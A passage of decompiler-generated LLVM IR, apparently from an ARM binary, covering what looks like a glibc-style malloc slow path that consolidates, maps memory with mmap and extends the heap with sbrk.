bb148:                                            ; preds = %dec_label_pc_12990
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v8_129b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v8_129b0, i32* %r3.global-to-local, align 4
  %v4_129b4 = load i32, i32* %r1.global-to-local, align 4
  %v6_129b4 = add i32 %v8_129b0, 48
  %v7_129b4 = inttoptr i32 %v6_129b4 to i32*
  store i32 %v4_129b4, i32* %v7_129b4, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_12990, %bb148
  %v0_129b8 = load i32, i32* @sl, align 4
  %v1_129b8 = or i32 %v0_129b8, 1
  store i32 %v1_129b8, i32* %r2.global-to-local, align 4
  %v0_129bc = load i32, i32* %ip.global-to-local, align 4
  %v1_129bc = or i32 %v0_129bc, 1
  store i32 %v1_129bc, i32* %r3.global-to-local, align 4
  %v0_129c0 = load i32, i32* @lr, align 4
  %v1_129c0 = add i32 %v0_129c0, 8
  store i32 %v1_129c0, i32* %r4.global-to-local, align 4
  %v2_129c4 = add i32 %v0_129c0, 4
  %v3_129c4 = inttoptr i32 %v2_129c4 to i32*
  store i32 %v1_129b8, i32* %v3_129c4, align 4
  %v0_129c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_129c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_129c8 = add i32 %v1_129c8, %v0_129c8
  %v4_129c8 = inttoptr i32 %v3_129c8 to i32*
  store i32 %v0_129c8, i32* %v4_129c8, align 4
  %v0_129cc = load i32, i32* %r3.global-to-local, align 4
  %v1_129cc = load i32, i32* %r1.global-to-local, align 4
  %v2_129cc = add i32 %v1_129cc, 4
  %v3_129cc = inttoptr i32 %v2_129cc to i32*
  store i32 %v0_129cc, i32* %v3_129cc, align 4
  br label %dec_label_pc_12e28

dec_label_pc_129d4.loopexit:                      ; preds = %dec_label_pc_128f4
  br label %dec_label_pc_129d4

dec_label_pc_129d4:                               ; preds = %dec_label_pc_129d4.loopexit, %dec_label_pc_125e8, %dec_label_pc_125f0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %ip.global-to-local, align 4
  %v4_129dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_129dc, i32* @r0, align 4
  %v1_129e0 = add i32 %v4_129dc, 44
  %v2_129e0 = inttoptr i32 %v1_129e0 to i32*
  %v3_129e0 = load i32, i32* %v2_129e0, align 4
  store i32 %v3_129e0, i32* %ip.global-to-local, align 4
  %v1_129e4 = add i32 %v3_129e0, 4
  %v2_129e4 = inttoptr i32 %v1_129e4 to i32*
  %v3_129e4 = load i32, i32* %v2_129e4, align 4
  %v0_129e8 = load i32, i32* @sl, align 4
  %v1_129e8 = add i32 %v0_129e8, 16
  store i32 %v1_129e8, i32* %r1.global-to-local, align 4
  %v1_129ec = and i32 %v3_129e4, -4
  store i32 %v1_129ec, i32* %r3.global-to-local, align 4
  %v3_129f0 = icmp ult i32 %v1_129ec, %v1_129e8
  br i1 %v3_129f0, label %dec_label_pc_12a20, label %dec_label_pc_129fc

dec_label_pc_129fc:                               ; preds = %dec_label_pc_129d4
  %v2_129fc = sub i32 %v1_129ec, %v0_129e8
  %v2_12a00 = add i32 %v0_129e8, %v3_129e0
  store i32 %v2_12a00, i32* %r1.global-to-local, align 4
  %v1_12a04 = or i32 %v2_129fc, 1
  store i32 %v1_12a04, i32* %r3.global-to-local, align 4
  %v1_12a08 = or i32 %v0_129e8, 1
  store i32 %v1_12a08, i32* %r2.global-to-local, align 4
  %v1_12a0c = add i32 %v3_129e0, 8
  store i32 %v1_12a0c, i32* %r4.global-to-local, align 4
  store i32 %v1_12a08, i32* %v2_129e4, align 4
  %v0_12a14 = load i32, i32* %r1.global-to-local, align 4
  %v1_12a14 = load i32, i32* @r0, align 4
  %v2_12a14 = add i32 %v1_12a14, 44
  %v3_12a14 = inttoptr i32 %v2_12a14 to i32*
  store i32 %v0_12a14, i32* %v3_12a14, align 4
  %v0_12a18 = load i32, i32* %r3.global-to-local, align 4
  %v1_12a18 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a18 = add i32 %v1_12a18, 4
  %v3_12a18 = inttoptr i32 %v2_12a18 to i32*
  store i32 %v0_12a18, i32* %v3_12a18, align 4
  br label %dec_label_pc_12e28

dec_label_pc_12a20:                               ; preds = %dec_label_pc_129d4
  %v1_12a20 = inttoptr i32 %v4_129dc to i32*
  %v2_12a20 = load i32, i32* %v1_12a20, align 4
  store i32 %v2_12a20, i32* %r3.global-to-local, align 4
  %v1_12a24 = and i32 %v2_12a20, 2
  store i32 %v1_12a24, i32* %ip.global-to-local, align 4
  %v2_12a24 = icmp eq i32 %v1_12a24, 0
  %v1_12a28 = add i32 %v4_129dc, 860
  %v2_12a28 = inttoptr i32 %v1_12a28 to i32*
  %v3_12a28 = load i32, i32* %v2_12a28, align 4
  store i32 %v3_12a28, i32* %r1.global-to-local, align 4
  br i1 %v2_12a24, label %dec_label_pc_12a40, label %dec_label_pc_12a30

dec_label_pc_12a30:                               ; preds = %dec_label_pc_12a20
  %v0_12a30 = call i32 @__malloc_consolidate()
  %v0_12a34 = load i32, i32* @sl, align 4
  %v1_12a34 = add i32 %v0_12a34, -7
  store i32 %v1_12a34, i32* @r0, align 4
  %v0_12a38 = call i32 @malloc()
  store i32 %v0_12a38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e24

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a20
  %v1_12a40 = add i32 %v4_129dc, 844
  %v2_12a40 = inttoptr i32 %v1_12a40 to i32*
  %v3_12a40 = load i32, i32* %v2_12a40, align 4
  store i32 %v3_12a40, i32* %r3.global-to-local, align 4
  %v3_12a44 = icmp ult i32 %v0_129e8, %v3_12a40
  %v1_12a48 = add i32 %v3_12a28, -1
  store i32 %v1_12a48, i32* %sb.global-to-local, align 4
  br i1 %v3_12a44, label %dec_label_pc_12b1c, label %dec_label_pc_12a50

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a40
  %v1_12a50 = add i32 %v4_129dc, 852
  %v2_12a50 = inttoptr i32 %v1_12a50 to i32*
  %v3_12a50 = load i32, i32* %v2_12a50, align 4
  store i32 %v3_12a50, i32* %r2.global-to-local, align 4
  %v1_12a54 = add i32 %v4_129dc, 848
  %v2_12a54 = inttoptr i32 %v1_12a54 to i32*
  %v3_12a54 = load i32, i32* %v2_12a54, align 4
  store i32 %v3_12a54, i32* %r3.global-to-local, align 4
  %v6_12a5c = icmp slt i32 %v3_12a54, %v3_12a50
  br i1 %v6_12a5c, label %dec_label_pc_12a60, label %dec_label_pc_12b1c

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a50
  %v1_12a60 = add i32 %v0_129e8, 10
  %v2_12a64 = add i32 %v1_12a60, %v3_12a28
  store i32 %v2_12a64, i32* %r3.global-to-local, align 4
  %v2_12a68 = sub i32 0, %v3_12a28
  %v3_12a68 = and i32 %v2_12a64, %v2_12a68
  store i32 %v3_12a68, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_12a68, %v0_129e8
  br i1 %tmp214, label %dec_label_pc_12a74, label %dec_label_pc_12b1c

dec_label_pc_12a74:                               ; preds = %dec_label_pc_12a60
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12a68, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12a8c = call i32 @mmap(i32 0, i32 %v3_12a68, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12a8c, i32* %r0.global-to-local, align 4
  %v7_12a90 = icmp eq i32 %v6_12a8c, -1
  br i1 %v7_12a90, label %dec_label_pc_12a74.dec_label_pc_12b1c_crit_edge, label %dec_label_pc_12a98

dec_label_pc_12a74.dec_label_pc_12b1c_crit_edge:  ; preds = %dec_label_pc_12a74
  %v1_12b40.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12b1c

dec_label_pc_12a98:                               ; preds = %dec_label_pc_12a74
  %v1_12a98 = urem i32 %v6_12a8c, 8
  store i32 %v1_12a98, i32* %r2.global-to-local, align 4
  %v2_12a98 = icmp eq i32 %v1_12a98, 0
  br i1 %v2_12a98, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_12a98
  %v2_12a9c = sub nsw i32 8, %v1_12a98
  store i32 %v2_12a9c, i32* %r3.global-to-local, align 4
  %v2_12aa0 = load i32, i32* @r4, align 4
  %v3_12aa0 = sub i32 %v2_12aa0, %v2_12a9c
  %v3_12aa4 = add i32 %v2_12a9c, %v6_12a8c
  store i32 %v3_12aa4, i32* %lr.global-to-local, align 4
  %v2_12aac = or i32 %v3_12aa0, 2
  store i32 %v2_12aac, i32* %r2.global-to-local, align 4
  %v5_12ab4 = inttoptr i32 %v3_12aa4 to i32*
  store i32 %v2_12a9c, i32* %v5_12ab4, align 4
  %v1_12ab8 = load i32, i32* %r2.global-to-local, align 4
  %v2_12ab8 = load i32, i32* %lr.global-to-local, align 4
  %v3_12ab8 = add i32 %v2_12ab8, 4
  %v4_12ab8 = inttoptr i32 %v3_12ab8 to i32*
  store i32 %v1_12ab8, i32* %v4_12ab8, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_12a98
  store i32 %v6_12a8c, i32* %lr.global-to-local, align 4
  %v1_12ab050 = load i32, i32* @r4, align 4
  %v2_12ab051 = or i32 %v1_12ab050, 2
  store i32 %v2_12ab051, i32* %r3.global-to-local, align 4
  %v3_12abc = inttoptr i32 %v6_12a8c to i32*
  store i32 0, i32* %v3_12abc, align 4
  %v1_12ac0 = load i32, i32* %r3.global-to-local, align 4
  %v2_12ac0 = load i32, i32* %lr.global-to-local, align 4
  %v3_12ac0 = add i32 %v2_12ac0, 4
  %v4_12ac0 = inttoptr i32 %v3_12ac0 to i32*
  store i32 %v1_12ac0, i32* %v4_12ac0, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12acc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_12acc, i32* %ip.global-to-local, align 4
  %v1_12ad0 = add i32 %v4_12acc, 848
  %v2_12ad0 = inttoptr i32 %v1_12ad0 to i32*
  %v3_12ad0 = load i32, i32* %v2_12ad0, align 4
  store i32 %v3_12ad0, i32* %r3.global-to-local, align 4
  %v1_12ad4 = add i32 %v4_12acc, 856
  %v2_12ad4 = inttoptr i32 %v1_12ad4 to i32*
  %v3_12ad4 = load i32, i32* %v2_12ad4, align 4
  store i32 %v3_12ad4, i32* %r2.global-to-local, align 4
  %v1_12ad8 = add i32 %v3_12ad0, 1
  store i32 %v1_12ad8, i32* %r3.global-to-local, align 4
  %v7_12ae0 = icmp sgt i32 %v1_12ad8, %v3_12ad4
  br i1 %v7_12ae0, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_12ad8, i32* %v2_12ad4, align 4
  %v0_12ae4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12ae4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_12ae4 = phi i32 [ %v4_12acc, %.thread30 ], [ %v1_12ae4.pre, %bb150 ]
  %v0_12ae4 = phi i32 [ %v1_12ad8, %.thread30 ], [ %v0_12ae4.pre, %bb150 ]
  %v2_12ae4 = add i32 %v1_12ae4, 848
  %v3_12ae4 = inttoptr i32 %v2_12ae4 to i32*
  store i32 %v0_12ae4, i32* %v3_12ae4, align 4
  %v0_12ae8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ae8 = add i32 %v0_12ae8, 868
  %v2_12ae8 = inttoptr i32 %v1_12ae8 to i32*
  %v3_12ae8 = load i32, i32* %v2_12ae8, align 4
  store i32 %v3_12ae8, i32* %r3.global-to-local, align 4
  %v1_12aec = add i32 %v0_12ae8, 880
  %v2_12aec = inttoptr i32 %v1_12aec to i32*
  %v3_12aec = load i32, i32* %v2_12aec, align 4
  store i32 %v3_12aec, i32* %r2.global-to-local, align 4
  %v0_12af0 = load i32, i32* @r4, align 4
  %v2_12af0 = add i32 %v0_12af0, %v3_12ae8
  store i32 %v2_12af0, i32* %r1.global-to-local, align 4
  %v1_12af4 = add i32 %v0_12ae8, 872
  %v2_12af4 = inttoptr i32 %v1_12af4 to i32*
  %v3_12af4 = load i32, i32* %v2_12af4, align 4
  store i32 %v3_12af4, i32* %r3.global-to-local, align 4
  %v1_12afc = add i32 %v0_12ae8, 884
  %v2_12afc = inttoptr i32 %v1_12afc to i32*
  %v3_12afc = load i32, i32* %v2_12afc, align 4
  store i32 %v3_12afc, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_12af0, %v3_12aec
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_12af0, i32* %v2_12aec, align 4
  %v0_12b04.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12b04.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_12b04 = phi i32 [ %v0_12ae8, %bb151 ], [ %v1_12b04.pre, %bb152 ]
  %v0_12b04 = phi i32 [ %v2_12af0, %bb151 ], [ %v0_12b04.pre, %bb152 ]
  %v2_12b04 = add i32 %v1_12b04, 868
  %v3_12b04 = inttoptr i32 %v2_12b04 to i32*
  store i32 %v0_12b04, i32* %v3_12b04, align 4
  %v0_12b08 = load i32, i32* %r1.global-to-local, align 4
  %v1_12b08 = load i32, i32* %r3.global-to-local, align 4
  %v2_12b08 = add i32 %v1_12b08, %v0_12b08
  store i32 %v2_12b08, i32* %r1.global-to-local, align 4
  %v1_12b0c = load i32, i32* %r2.global-to-local, align 4
  %v0_12b10 = load i32, i32* %lr.global-to-local, align 4
  %v1_12b10 = add i32 %v0_12b10, 8
  store i32 %v1_12b10, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_12b08, %v1_12b0c
  br i1 %tmp216, label %bb154, label %dec_label_pc_12e24

bb154:                                            ; preds = %bb153
  %v5_12b14 = load i32, i32* %ip.global-to-local, align 4
  %v6_12b14 = add i32 %v5_12b14, 884
  %v7_12b14 = inttoptr i32 %v6_12b14 to i32*
  store i32 %v2_12b08, i32* %v7_12b14, align 4
  br label %dec_label_pc_12e24

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12a60, %dec_label_pc_12a40, %dec_label_pc_12a74.dec_label_pc_12b1c_crit_edge, %dec_label_pc_12a50
  %v1_12b40 = phi i32 [ %v1_12b40.pre, %dec_label_pc_12a74.dec_label_pc_12b1c_crit_edge ], [ %v0_129e8, %dec_label_pc_12a50 ], [ %v0_129e8, %dec_label_pc_12a40 ], [ %v0_129e8, %dec_label_pc_12a60 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %ip.global-to-local, align 4
  %v4_12b24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_12b24, i32* %r3.global-to-local, align 4
  %v1_12b28 = add i32 %v4_12b24, 44
  %v2_12b28 = inttoptr i32 %v1_12b28 to i32*
  %v3_12b28 = load i32, i32* %v2_12b28, align 4
  store i32 %v3_12b28, i32* %r0.global-to-local, align 4
  %v1_12b2c = add i32 %v4_12b24, 864
  %v2_12b2c = inttoptr i32 %v1_12b2c to i32*
  %v3_12b2c = load i32, i32* %v2_12b2c, align 4
  store i32 %v3_12b2c, i32* %r2.global-to-local, align 4
  %v1_12b30 = add i32 %v4_12b24, 840
  %v2_12b30 = inttoptr i32 %v1_12b30 to i32*
  %v3_12b30 = load i32, i32* %v2_12b30, align 4
  store i32 %v3_12b30, i32* %r3.global-to-local, align 4
  %v1_12b34 = add i32 %v3_12b28, 4
  %v2_12b34 = inttoptr i32 %v1_12b34 to i32*
  %v3_12b34 = load i32, i32* %v2_12b34, align 4
  store i32 %v3_12b34, i32* %r1.global-to-local, align 4
  %v1_12b3c = urem i32 %v3_12b2c, 2
  %v2_12b3c = icmp eq i32 %v1_12b3c, 0
  %v1_12b38 = add i32 %v1_12b40, 16
  %v2_12b40 = add i32 %v1_12b38, %v3_12b30
  store i32 %v2_12b40, i32* %r3.global-to-local, align 4
  %v1_12b44 = and i32 %v3_12b34, -4
  store i32 %v1_12b44, i32* @r8, align 4
  br i1 %v2_12b3c, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_12b1c
  %v3_12b48 = sub i32 %v2_12b40, %v1_12b44
  store i32 %v3_12b48, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_12b1c, %bb155
  %v0_12b4c = phi i32 [ %v2_12b40, %dec_label_pc_12b1c ], [ %v3_12b48, %bb155 ]
  %v1_12b4c = load i32, i32* %sb.global-to-local, align 4
  %v2_12b4c = add i32 %v1_12b4c, %v0_12b4c
  store i32 %v2_12b4c, i32* %r3.global-to-local, align 4
  %v1_12b50 = sub i32 -1, %v1_12b4c
  store i32 %v1_12b50, i32* %fp.global-to-local, align 4
  %v2_12b54 = and i32 %v2_12b4c, %v1_12b50
  store i32 %v2_12b54, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_12b54, 1
  br i1 %tmp157, label %dec_label_pc_12b78, label %dec_label_pc_12b64

dec_label_pc_12b64:                               ; preds = %bb156
  store i32 %v2_12b54, i32* %r0.global-to-local, align 4
  %v1_12b68 = call i32 @__GI_sbrk(i32 %v2_12b54)
  store i32 %v1_12b68, i32* %r0.global-to-local, align 4
  %v3_12b6c = icmp eq i32 %v1_12b68, -1
  store i32 %v1_12b68, i32* @r4, align 4
  br i1 %v3_12b6c, label %dec_label_pc_12b78, label %dec_label_pc_12be4

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b64, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r1.global-to-local, align 4
  %v4_12b80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_12b80, i32* %r6.global-to-local, align 4
  %v1_12b84 = add i32 %v4_12b80, 864
  %v2_12b84 = inttoptr i32 %v1_12b84 to i32*
  %v3_12b84 = load i32, i32* %v2_12b84, align 4
  store i32 %v3_12b84, i32* %r3.global-to-local, align 4
  %v1_12b88 = urem i32 %v3_12b84, 2
  %v2_12b88 = icmp eq i32 %v1_12b88, 0
  br i1 %v2_12b88, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_12b78
  %v1_12b8c = load i32, i32* @r8, align 4
  %v2_12b8c = load i32, i32* %sb.global-to-local, align 4
  %v3_12b8c = add i32 %v2_12b8c, %v1_12b8c
  %v2_12b90 = load i32, i32* @r5, align 4
  %v3_12b90 = add i32 %v3_12b8c, %v2_12b90
  store i32 %v3_12b90, i32* %r3.global-to-local, align 4
  %v2_12b94 = load i32, i32* %fp.global-to-local, align 4
  %v3_12b94 = and i32 %v2_12b94, %v3_12b90
  store i32 %v3_12b94, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_12b78
  %v0_12b98.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_12b98 = phi i32 [ %v0_12b98.pr, %.thread32thread-pre-split ], [ %v3_12b94, %bb158 ]
  %v2_12b98 = icmp ugt i32 %v0_12b98, 1048575
  br i1 %v2_12b98, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_12bb0 = phi i32 [ %v0_12b98, %.thread32 ], [ 1048576, %bb159 ]
  %v1_12ba0 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_12bb0, %v1_12ba0
  br i1 %tmp217, label %dec_label_pc_12ba8, label %dec_label_pc_12e0c

dec_label_pc_12ba8:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12bb0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12bc4 = call i32 @mmap(i32 0, i32 %v0_12bb0, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12bc4, i32* %r0.global-to-local, align 4
  %v3_12bc8 = icmp eq i32 %v6_12bc4, -1
  %v8_12bc8 = icmp eq i32 %v6_12bc4, -1
  store i32 %v6_12bc4, i32* @r4, align 4
  br i1 %v8_12bc8, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_12ba8
  %v1_12bd0 = load i32, i32* %r6.global-to-local, align 4
  %v2_12bd0 = add i32 %v1_12bd0, 864
  %v3_12bd0 = inttoptr i32 %v2_12bd0 to i32*
  %v4_12bd0 = load i32, i32* %v3_12bd0, align 4
  %v2_12bd4 = load i32, i32* @r5, align 4
  %v3_12bd4 = add i32 %v2_12bd4, %v6_12bc4
  store i32 %v3_12bd4, i32* %r0.global-to-local, align 4
  %v2_12bd8 = and i32 %v4_12bd0, -2
  store i32 %v2_12bd8, i32* %r3.global-to-local, align 4
  store i32 %v2_12bd8, i32* %v3_12bd0, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_12ba8, %bb161
  br i1 %v3_12bc8, label %dec_label_pc_12be4, label %dec_label_pc_12be8

dec_label_pc_12be4:                               ; preds = %.thread35, %dec_label_pc_12b64
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12be8

dec_label_pc_12be8:                               ; preds = %.thread35, %dec_label_pc_12be4
  %v0_12be8 = load i32, i32* @r4, align 4
  %v7_12be8 = icmp eq i32 %v0_12be8, -1
  br i1 %v7_12be8, label %dec_label_pc_12e0c, label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12be8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v4_12bf8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_12bf8, i32* %ip.global-to-local, align 4
  store i32 %v3_12b28, i32* %r2.global-to-local, align 4
  %v1_12c00 = add i32 %v4_12bf8, 872
  %v2_12c00 = inttoptr i32 %v1_12c00 to i32*
  %v3_12c00 = load i32, i32* %v2_12c00, align 4
  %v1_12c04 = load i32, i32* @r8, align 4
  %v2_12c04 = add i32 %v1_12c04, %v3_12b28
  store i32 %v2_12c04, i32* %r1.global-to-local, align 4
  %v0_12c08 = load i32, i32* @r5, align 4
  %v2_12c08 = add i32 %v0_12c08, %v3_12c00
  store i32 %v2_12c08, i32* %r3.global-to-local, align 4
  %v9_12c0c = icmp eq i32 %v0_12be8, %v2_12c04
  br i1 %v9_12c0c, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_12bf0
  store i32 %v2_12c08, i32* %v2_12c00, align 4
  br label %dec_label_pc_12c28

bb162:                                            ; preds = %dec_label_pc_12bf0
  %v1_12c10 = load i32, i32* %r0.global-to-local, align 4
  %v8_12c10 = icmp eq i32 %v1_12c10, -1
  store i32 %v2_12c08, i32* %v2_12c00, align 4
  br i1 %v8_12c10, label %.thread37, label %dec_label_pc_12c28

.thread37:                                        ; preds = %bb162
  %v1_12c18 = load i32, i32* @r5, align 4
  %v2_12c18 = load i32, i32* @r8, align 4
  %v3_12c18 = add i32 %v2_12c18, %v1_12c18
  %v2_12c1c = or i32 %v3_12c18, 1
  store i32 %v2_12c1c, i32* %r3.global-to-local, align 4
  %v2_12c20 = load i32, i32* %r2.global-to-local, align 4
  %v3_12c20 = add i32 %v2_12c20, 4
  %v4_12c20 = inttoptr i32 %v3_12c20 to i32*
  store i32 %v2_12c1c, i32* %v4_12c20, align 4
  br label %dec_label_pc_12da0

dec_label_pc_12c28:                               ; preds = %bb162, %.thread125
  %v0_12c2c.pr = load i32, i32* @r8, align 4
  %v0_12c28 = load i32, i32* %ip.global-to-local, align 4
  %v1_12c28 = add i32 %v0_12c28, 864
  %v2_12c28 = inttoptr i32 %v1_12c28 to i32*
  %v3_12c28 = load i32, i32* %v2_12c28, align 4
  store i32 %v3_12c28, i32* %r2.global-to-local, align 4
  %v2_12c2c = icmp eq i32 %v0_12c2c.pr, 0
  br i1 %v2_12c2c, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_12c28
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_12c28
  %v2_12c34 = urem i32 %v3_12c28, 2
  store i32 %v2_12c34, i32* %r3.global-to-local, align 4
  %v2_12c38 = icmp eq i32 %v2_12c34, 0
  br i1 %v2_12c38, label %.thread43, label %dec_label_pc_12c40

dec_label_pc_12c40:                               ; preds = %.thread39
  %v0_12c40 = load i32, i32* @r4, align 4
  %v1_12c40 = load i32, i32* %r1.global-to-local, align 4
  %v3_12c40 = icmp ult i32 %v0_12c40, %v1_12c40
  br i1 %v3_12c40, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_12c40
  %v2_12c44 = and i32 %v3_12c28, -2
  store i32 %v2_12c44, i32* %r3.global-to-local, align 4
  store i32 %v2_12c44, i32* %v2_12c28, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12c40, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %ip.global-to-local, align 4
  %v4_12c54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_12c54, i32* @r7, align 4
  %v1_12c58 = add i32 %v4_12c54, 864
  %v2_12c58 = inttoptr i32 %v1_12c58 to i32*
  %v3_12c58 = load i32, i32* %v2_12c58, align 4
  store i32 %v3_12c58, i32* %r3.global-to-local, align 4
  %v1_12c5c = urem i32 %v3_12c58, 2
  store i32 %v1_12c5c, i32* @r6, align 4
  %v2_12c5c = icmp eq i32 %v1_12c5c, 0
  br i1 %v2_12c5c, label %dec_label_pc_12cf0, label %dec_label_pc_12c64

dec_label_pc_12c64:                               ; preds = %.thread43
  %v0_12c64 = load i32, i32* @r8, align 4
  %v2_12c64 = icmp eq i32 %v0_12c64, 0
  br i1 %v2_12c64, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_12c64
  %v2_12c68 = add i32 %v4_12c54, 872
  %v3_12c68 = inttoptr i32 %v2_12c68 to i32*
  %v4_12c68 = load i32, i32* %v3_12c68, align 4
  store i32 %v4_12c68, i32* %r2.global-to-local, align 4
  %v1_12c6c = load i32, i32* %r1.global-to-local, align 4
  %v2_12c6c = load i32, i32* @r4, align 4
  %v3_12c6c = sub i32 %v2_12c6c, %v1_12c6c
  %v3_12c70 = add i32 %v3_12c6c, %v4_12c68
  store i32 %v3_12c70, i32* %r3.global-to-local, align 4
  store i32 %v3_12c70, i32* %v3_12c68, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_12c64, %bb164
  %v0_12c78 = load i32, i32* @r4, align 4
  %v1_12c78 = urem i32 %v0_12c78, 8
  store i32 %v1_12c78, i32* %r3.global-to-local, align 4
  %v2_12c78 = icmp eq i32 %v1_12c78, 0
  br i1 %v2_12c78, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_12c7c = sub nsw i32 8, %v1_12c78
  store i32 %v2_12c7c, i32* %r3.global-to-local, align 4
  %v3_12c80 = add i32 %v2_12c7c, %v0_12c78
  store i32 %v3_12c80, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_12c88 = phi i32 [ 0, %.thread46 ], [ %v2_12c7c, %bb165 ]
  %v1_12c84 = load i32, i32* @r5, align 4
  %v2_12c84 = add i32 %v1_12c84, %v0_12c78
  store i32 %v2_12c84, i32* @r6, align 4
  %v1_12c88 = load i32, i32* @r8, align 4
  %v2_12c88 = add i32 %v2_12c84, %v0_12c88
  %v2_12c8c = add i32 %v2_12c88, %v1_12c88
  store i32 %v2_12c8c, i32* %r1.global-to-local, align 4
  %v1_12c90 = load i32, i32* %sb.global-to-local, align 4
  %v2_12c90 = add i32 %v1_12c90, %v2_12c8c
  %v1_12c94 = load i32, i32* %fp.global-to-local, align 4
  %v2_12c94 = and i32 %v1_12c94, %v2_12c90
  store i32 %v2_12c94, i32* %r2.global-to-local, align 4
  %v2_12c98 = sub i32 0, %v2_12c84
  store i32 %v2_12c98, i32* %r3.global-to-local, align 4
  %v2_12c9c = sub i32 %v2_12c94, %v2_12c84
  store i32 %v2_12c9c, i32* @r5, align 4
  store i32 %v2_12c9c, i32* %r0.global-to-local, align 4
  br i1 %v2_12c78, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_12c78, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_12ca8 = call i32 @__GI_sbrk(i32 %v2_12c9c)
